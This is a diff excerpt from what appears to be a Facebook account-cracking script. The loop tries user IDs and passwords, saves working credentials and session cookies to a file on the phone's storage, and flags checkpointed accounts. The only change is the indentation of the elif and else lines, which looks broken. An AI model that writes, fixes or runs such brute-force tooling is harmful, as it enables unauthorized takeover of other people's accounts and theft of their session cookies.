@@ -334,11 +334,11 @@ def gxds_files(uid,pwx):
                     open("/sdcard/gxds-ok.txt","a").write(uid+"|"+ps+"\n"+cookie+"\n")
                     oks.append(uid)
                     break
-            elif "www.facebook.com" in q['error']['message']:
+             elif "www.facebook.com" in q['error']['message']:
                 print(f"\r\r{lr}  [GXDS-CP] {uid}|{ps}")
                 cps.append(uid)
                 break
-            else:
+             else:
                 continue 
         loop += 1
     except requests.exceptions.ConnectionError:
